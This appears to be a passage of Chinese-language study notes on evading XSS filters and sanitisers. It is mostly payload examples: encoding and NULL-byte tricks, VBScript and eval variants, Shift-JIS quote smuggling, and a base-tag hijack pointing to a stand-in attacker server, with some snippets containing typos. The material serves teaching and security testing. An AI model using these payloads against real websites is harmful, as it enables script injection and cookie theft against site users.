<h5 id="避开过滤：HTML"><a href="#避开过滤：HTML" class="headerlink" title="避开过滤：HTML"></a>避开过滤：HTML</h5><p>一些应用程序使用正规表达式，对于前面提到的各种插入办法的输入进行过滤，为了避开过滤，需要对输入进行模糊处理，常用的方法如下：</p>
<h6 id="标签名称"><a href="#标签名称" class="headerlink" title="标签名称"></a>标签名称</h6><p>改变标签名称的大小写</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iMg</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> <span class="attr">src</span>=<span class="string">&quot;a&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在任意位置插入 NULL 字节</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;[%00]img onerror=alert(1) src=&quot;a&quot;&gt;&lt;/[%00]img&gt;</span><br><span class="line">&lt;i[%00]mg onerror=alert(1) src=&quot;a&quot;&gt;&lt;/i[%00]mg&gt;</span><br><span class="line">&lt;!-此处的 %XX 格式表示某个字符的 ASCII 的十六进制编码-&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>NULL 常常可以有效应用防火墙的过滤，因为防火墙程序通常将 NULL 识别为字符串的终止符，从而无法发现 NULL 字节后的恶意插入；</p>
</blockquote>
<p>直接修改标签名称，以避开针对标签名称的过滤</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">x</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span> <span class="attr">src</span>=<span class="string">a</span>&gt;</span>Click here<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>劫持 base 标签，base 标签用来指定脚本源的域名，因此，如果应用程序有使用 base，并且在 base 之后的脚本引用，都是相对路径，那么可以在原来的 base 之后，插入一个新的 base ，将其指向攻击者自己的服务器，这样后续的脚本就会改向攻击者的服务器请求脚本；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://mdattacker.net/badscripts/&quot;</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;goodscript.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;!-通常 base 标签仅允许出现在 head 部分，但少数浏览器如 firefox 允许出现在页面的任何位置-&gt;</span><br></pre></td></tr></table></figure>

<p>使用一些特殊字符来替代空格，干扰过滤规则</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/onerror=alert(1) src=a&gt;</span><br><span class="line">&lt;img[%09]onerror=alert(1) src=a&gt;</span><br><span class="line">&lt;img[%0d]onerror=alert(1) src=a&gt;</span><br><span class="line">&lt;img[%0a]onerror=alert(1) src=a&gt;</span><br><span class="line">&lt;img/&quot;onerror=alert(1) src=a&gt;</span><br><span class="line">&lt;img/&#x27;onerror=alert(1) src=a&gt;</span><br><span class="line">&lt;img/anyjunk/onerror=alert(1) src=a&gt;       </span><br></pre></td></tr></table></figure>

<blockquote>
<p>即使在实施攻击时不需要任何标签属性，但应始终在标签名称后面添加一些多余的内容，因为这样可以避开一些简单的过滤，例如：&lt;img&#x2F;anyjunk&#x2F;onerror&#x3D;alert(1) src&#x3D;a&gt;</p>
</blockquote>
<h6 id="属性名称"><a href="#属性名称" class="headerlink" title="属性名称"></a>属性名称</h6><p>就像标签名称一样，也可以在属性的名称中使用 NULL 技巧，例如：&lt;img o[%00]nerror&#x3D;alert(1) src&#x3D;a&gt;，这样可以避开基于 on 开头的属性名称的过滤；</p>
<h6 id="属性分隔符"><a href="#属性分隔符" class="headerlink" title="属性分隔符"></a>属性分隔符</h6><p>属性的分隔一般使用空格，但实际上也可以使用双引号或者单引号（IE 上还可以使用重音符）；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span><span class="attr">src</span>=<span class="string">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(1)&#x27;</span> <span class="attr">src</span>=<span class="string">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=`<span class="attr">alert</span>(<span class="attr">1</span>)` <span class="attr">src</span>=<span class="string">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过使用引号或者重音符来分隔属性，并在标签名称后面使用特殊符号来替代空格，则可以实现整个输入都没有使用任何空格的情况，从而避开一些简单的过滤</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/onerror=&quot;alert(1)&quot;src=a&gt;</span><br></pre></td></tr></table></figure>

<h6 id="属性值"><a href="#属性值" class="headerlink" title="属性值"></a>属性值</h6><p>属性值同样也可以使用 NULL 技巧，并且还可以使用 HTML 编码字符对输入进行模糊处理</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">a[%00]alert(1)</span> <span class="attr">src</span>=<span class="string">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">a&amp;#x6c;ert(1)</span> <span class="attr">src</span>=<span class="string">a</span>&gt;</span></span><br><span class="line">&lt;!-以下使用 HTML 编码对 javascript 伪源进行了编码-&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">j&amp;#x61;vasc&amp;#x72ipt&amp;#x3a;alert&amp;#x28;1&amp;#x29;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在使用 HTML 编码时，应注意到，浏览器支持多种编码变体，例如可以使用十进制或者十六进制格式，添加多余的前导零，并省略结尾分号等；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-十六进制，前导零-&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">a&amp;#x06c;ert(1)</span> <span class="attr">src</span>=<span class="string">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">a&amp;#x006c;ert(1)</span> <span class="attr">src</span>=<span class="string">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">a&amp;#x0006c;ert(1)</span> <span class="attr">src</span>=<span class="string">a</span>&gt;</span></span><br><span class="line">&lt;!-十进制，前导零，省略分号-&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">a&amp;108;ert(1)</span> <span class="attr">src</span>=<span class="string">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">a&amp;#0108;ert(1)</span> <span class="attr">src</span>=<span class="string">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">a&amp;#108ert(1)</span> <span class="attr">src</span>=<span class="string">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">a&amp;#0101ert(1)</span> <span class="attr">src</span>=<span class="string">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="标签括号"><a href="#标签括号" class="headerlink" title="标签括号"></a>标签括号</h6><p>有些应用程序会对过滤后的输入进行不必要的 HTML 解码，例如</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--实际输入如下，没有使用任何的括号，并使用 %25 和 %20 来代替 % 和空格--&gt;</span></span><br><span class="line">%253cimg%20onerror=alert(1)%20src=a%253e</span><br><span class="line"><span class="comment">&lt;!--第一层解码，%25 和 %20 被转换为实际的百分符和空格，变成如下--&gt;</span></span><br><span class="line">%3cimg onerror=alert(1) src=a%3e</span><br><span class="line"><span class="comment">&lt;!--由于应用程序会对输入进行 HTML 解码，导致最终呈现在浏览器中的输入变成如下字符--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> <span class="attr">src</span>=<span class="string">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>有些应用程序会将不常见的 Unicode 字符转换为相近的 ASCII 字符进行处理，例如双尖括号会转移为单尖括号，从而有机会避开过滤规则；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> <span class="attr">src</span>=<span class="string">a</span>&gt;</span>&gt;</span><br><span class="line">%u00ABimg onerror=alert(1) src=a%u00BB</span><br></pre></td></tr></table></figure>

<p>很多过滤规则的算法比较简单，例如简单的匹配起始和结束的尖括号，提取内容，并将其与黑名单进行比较，来识别 HTML 标签，此时可以使用多余的括号来避开过滤（前提是浏览器接受这种多余的括号）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="number">1</span>);<span class="comment">//&lt;&lt;/srcipt&gt;</span></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>由于历史原因，有大量的合法的网站，使用不规范的 HTML 格式，而浏览器为了尽可能的兼容它们以进行正确的显示，导致浏览器接受各种不合法的 HTML 内容格式，并自动将其转换为规范的格式，这就为漏洞留下了大量的机会；可使用浏览器自带的工具，如“查看生成的源”，来查看浏览器如何转换一些不规范的格式；</p>
</blockquote>
<h6 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h6><p>使用不同的字符集来编码输入，常常可以避开过滤规则，不过它的挑战在于如何让浏览器按正确的字符集进行解析，一般需要能够控制 HTTP 响应头，例如 Content-Type 属性，或者对应的 HTML 元标签；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--对 &lt;script&gt;alert(document.cookie)/&lt;/script&gt; 在不同字符集下的编码--&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210305085037.png"></p>
<p> 如果应用程序默认支持使用多字节的字符集，例如 Shift-JIS，则可以在输入中使用在该字符集中具有特殊意义的字符，来避开输入过滤</p>
<p>例如某个应用程序支持 Shift-JIS 字符集，并在返回的响应中包括如下内容：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--用户输入1 和 用户输入2 两个位置可以根据用户输入显示的内容--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;image.gif&quot;</span> <span class="attr">alt</span>=<span class="string">[</span>&quot;<span class="attr">用户输入位置1</span>&quot;] /&gt;</span> ...[&quot;用户输入位置2&quot;]</span><br></pre></td></tr></table></figure>

<p>假设应用程序的过滤规则限制了在用户输入位置1使用引号，并在用户输入位置2限制使用尖括号，则此时可以将输入1和输入2分别设计为如下：</p>
<ul>
<li>输入1： %f0</li>
<li>输入2：”onload&#x3D;alert(1);</li>
</ul>
<p>根据 Shift-JIS 字符集，%f0 后面的引号，将被解析为 %f0 的组成部分，从而使用原本 HTML 属性中的引号失去作用，之后一直到输入2的位置的引号才完成配对，从而成功的插入了 onload&#x3D;alert(1) 语句；</p>
<blockquote>
<p>较少用的字符集包括：Shift-JIS、EUC-JP、BIG5 等；</p>
</blockquote>
<h5 id="避开过滤：脚本代码"><a href="#避开过滤：脚本代码" class="headerlink" title="避开过滤：脚本代码"></a>避开过滤：脚本代码</h5><p>有些过滤规则会对输入中的 javascript 敏感字符进行过滤，例如分号、圆括号、圆点等；此时需要对这些关键符号先进行模糊处理才行，常见的处理办法如下：</p>
<h6 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h6><p>javascript 支持多种转义方法，因此可以使用这些方法，对关键字符进行转义处理；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--对字母 L 进行 Unicode 转义 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>a\u006cert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果能够使用 eval 命令，则可以将需要执行的代码，弄成字符串，传给 eval 命令实现执行；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="string">&#x27;a\u006cert(1)&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // Unicode 转义</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="string">&#x27;a\x6cert(1)&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 十六进制转义</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="string">&#x27;a\154ert(1)&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 十进制转义</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="string">&#x27;a\l\ert&#x27;</span>(<span class="number">1</span>\);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 字符串中带转义符将会被忽略</span><br></pre></td></tr></table></figure>

<h6 id="动态构建字符串"><a href="#动态构建字符串" class="headerlink" title="动态构建字符串"></a>动态构建字符串</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="string">&#x27;al&#x27;</span>+<span class="string">&#x27;ert(1)&#x27;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="title function_">atob</span>(<span class="string">&#x27;amF2YXNjcmlwdDphbGVydCgxKQ&#x27;</span>));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // Base64 编码的方式</span><br></pre></td></tr></table></figure>

<h6 id="替代-eval-的方法"><a href="#替代-eval-的方法" class="headerlink" title="替代 eval 的方法"></a>替代 eval 的方法</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="string">&#x27;alert(1)&#x27;</span>.<span class="title function_">replace</span>(<span class="regexp">/.+/</span>,<span class="built_in">eval</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 字符串的内置函数+正则替换</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="attr">function</span>::[<span class="string">&#x27;alert&#x27;</span>](<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="替代圆点"><a href="#替代圆点" class="headerlink" title="替代圆点"></a>替代圆点</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>[<span class="string">&#x27;cookie&#x27;</span>]</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 使用中括号访问对象属性的方法</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">with</span>(<span class="variable language_">document</span>)<span class="title function_">alert</span>(cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 使用 with 语法</span><br></pre></td></tr></table></figure>

<h6 id="组合多种技巧"><a href="#组合多种技巧" class="headerlink" title="组合多种技巧"></a>组合多种技巧</h6><p>例如先使用 Unicode 对关键字进行转义，然后再使用 HTML 编码将 Unicode 用到的反斜杠进行编码，以避开过滤；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;<span class="attr">al</span>&amp;#<span class="attr">x5c</span>;<span class="attr">u0065rt</span>(<span class="attr">1</span>)&#x27;) <span class="attr">src</span>=<span class="string">a</span>&gt;</span> // 此处对 alert 单词中的 e 字母先用 Unicode 进行转义，然后再将 Unicode 转义中用到反斜杠进行 HTML 编码，</span><br></pre></td></tr></table></figure>

<p>此外还可以对 onerror 属性值中的任何字符进行 HTML 编码，以便进一步隐藏攻击；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210306114628.png"></p>
<p>很多针对 Javascript 的过滤规则一般会核查 Javascript 中使用到的关键字符，例如引号、点号、括号等，对这些符号使用 HTML 编码后，就可以避开过滤规则；</p>
<h6 id="使用-VBScript"><a href="#使用-VBScript" class="headerlink" title="使用 VBScript"></a>使用 VBScript</h6><p>通常 XSS 攻击都是使用 Javascript 语言来插入恶意脚本，但是有些浏览器除了支持 Javascript 外，还支持其他语言，例如 IE 浏览器支持 VBSript；因此，如果存在此种情况，则攻击者可以根据 VBSript 的语法语法特征来设计攻击脚本，以避开过滤规则；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">vbs</span>&gt;</span>MsgBox 1<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">&#x27;vbs:MsgBox 1&#x27;</span> <span class="attr">src</span>=<span class="string">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">oneeror</span>=<span class="string">MsgBox+1</span> <span class="attr">language</span>=<span class="string">vbs</span> <span class="attr">src</span>=<span class="string">a</span>&gt;</span> // Msgbox 之后接的加号表示空格，用来针对空格的过滤</span><br><span class="line">// 以上例子的 vbs 字样，同时还可以替换为 vbsript 字样，二者的效果是一样</span><br></pre></td></tr></table></figure>

<p>VBSript 的一些特点：</p>
<ul>
<li>不使用括号也可以实现函数的调用（可避开针对括号的过滤）；</li>
<li>不区分大小写（Javascript 语法规则要求表达式需要使用小写，不支持大写，可绕开进行大写转换的净化规则）；</li>
</ul>
<h6 id="组合-Javascript-和-VBSript"><a href="#组合-Javascript-和-VBSript" class="headerlink" title="组合 Javascript 和 VBSript"></a>组合 Javascript 和 VBSript</h6><p>可以设计从  Javascript 中调用 VBScript，或者反过来也行，从而增加攻击的复杂度，以避开过滤规则；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">execScript</span>(<span class="string">&quot;MsgBox 1&quot;</span>, <span class="string">&quot;vbscript&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">vbs</span>&gt;</span><span class="language-javascript"><span class="title function_">execScript</span>(<span class="string">&quot;alert(1)&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 以下是一个嵌套使用两种脚本的复杂示例</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">execScript</span>(<span class="string">&#x27;execScript&quot;alert(1)&quot;, &quot;javascript&quot;&#x27;</span>, <span class="string">&quot;vbscript&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于 VBSript 不区分大小写，即使输入被全部转换成大写后，仍然可以被浏览器执行，这意味着如果想实现 Javascript 的调用，可以使用 VBSript 脚本，调用内置的 LCASE 函数，将被净化规则转换后的大写，再次转换成小写来实现；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">LANGUAGE</span>=<span class="string">VBS</span>&gt;</span><span class="language-javascript"><span class="title function_">EXECSCRIPT</span>(<span class="title function_">LCASE</span>(<span class="string">&quot;ALERT(1)&quot;</span>))</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">ONERROR</span>=<span class="string">&quot;VBS:EXECSCRIPT LCASE(&#x27;ALERT(1)&#x27;)&quot;</span> <span class="attr">SRC</span>=<span class="string">A</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="使用经过编码的脚本"><a href="#使用经过编码的脚本" class="headerlink" title="使用经过编码的脚本"></a>使用经过编码的脚本</h6><p>早期微软在 IE 浏览器中，使用某种定制的脚本编码，对脚本进行模糊处理，以防止用户查看 HTML 页面的源代码，但后面该编码被破解了，导致了额外的一个漏洞，即攻击者可以根据该编码规则，先对输入进行模糊处理，以避开过滤规则，然后输入最终又会被浏览器解码成正确的脚本内容；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210306120830.png"></p>
<h5 id="避开净化"><a href="#避开净化" class="headerlink" title="避开净化"></a>避开净化</h5><blockquote>
<p>净化是一种防守策略，不过貌似直接拒绝请求，并根据情况加入黑名单不是更好？</p>
</blockquote>
<p> 净化是一种应对攻击的常用策略，其中一种常见的方法是将输入进行 HTML 编码，这样就可以避免输入的脚本被浏览器执行；有时候，应用程序甚至会删除输入中的特定字符，以清除其中可能包含的恶意内容；此时需要做两件事情：</p>
<ul>
<li>了解程序对哪些字符实施了净化规则，然后组合多种技巧避开它们；</li>
<li>了解输入内容被净化后，余下的内容有无可能实施攻击</li>
</ul>
<p>净化算法经常有漏洞，例如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// 只替换了第一个匹配值</span><br><span class="line">输入：<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">结果：<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 没有递归</span><br><span class="line">输入：&lt;src<span class="tag">&lt;<span class="name">script</span>&gt;</span>ipt&gt;alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">结果：<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 对多个关键字实施净化时，使用固定的处理顺序，因此攻击者可以利用该顺序，让第一个步骤未能找到匹配值，然后利用第二个步骤的净化结果，得到想要插入的正确脚本</span><br><span class="line">输入：&lt;src<span class="tag">&lt;<span class="name">object</span>&gt;</span>ipt&gt;alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">结果：<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 净化规则会转义引号，但未转义反斜杠本身，因此，攻击者可以在输入中加入反斜杠，对净化规则添加的反斜杠进行转义，使其失效；</span><br><span class="line">输入：var a = foo\&quot;; alert(1); //</span><br><span class="line">结果：var a = &quot;foo\\&quot;; alert(1);//&quot;;</span><br><span class="line"></span><br><span class="line">// 未处理尖括号，攻击者有机会利用转义会废弃原脚本，原因：浏览器会优先解析 HTML 标签，再处理 js 脚本</span><br><span class="line">输入：<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">结果：<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="keyword">var</span> a = <span class="string">&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;</span><br><span class="line">// 虽然此处变量 a 的声明中只包含1个引号，不符合 js 语法，可能会出现报错，但问题不大，因为浏览器会跳过，直接执行下一段脚本</span><br><span class="line"></span><br><span class="line">// 如果注入的位置处于事件中，则可以使用 HTML 编码来避开净化</span><br><span class="line">位置 foo：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;var a = &#x27;foo&#x27;&quot;</span>;&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">输入：foo<span class="symbol">&amp;apos;</span>; alert(1); //</span><br><span class="line">直接结果：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;var a = &#x27;foo<span class="symbol">&amp;apos;</span>; alert(1); //&#x27;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">解码后结果：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;var a = &#x27;foo&quot;</span>; <span class="attr">alert</span>(<span class="attr">1</span>); //&#x27;&quot;&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>一些净化规则的设计者认为对用户的输入进行 HTML 编码，可以规避 XSS 攻击，但由于浏览器在编译 HTML 文本前，会先对其进行 HTML 解码的动作，因此，规避攻击的意图不一定可以实现；</p>
<h5 id="避开长度限制"><a href="#避开长度限制" class="headerlink" title="避开长度限制"></a>避开长度限制</h5><p>方法一：使用尽可能短的脚本</p>
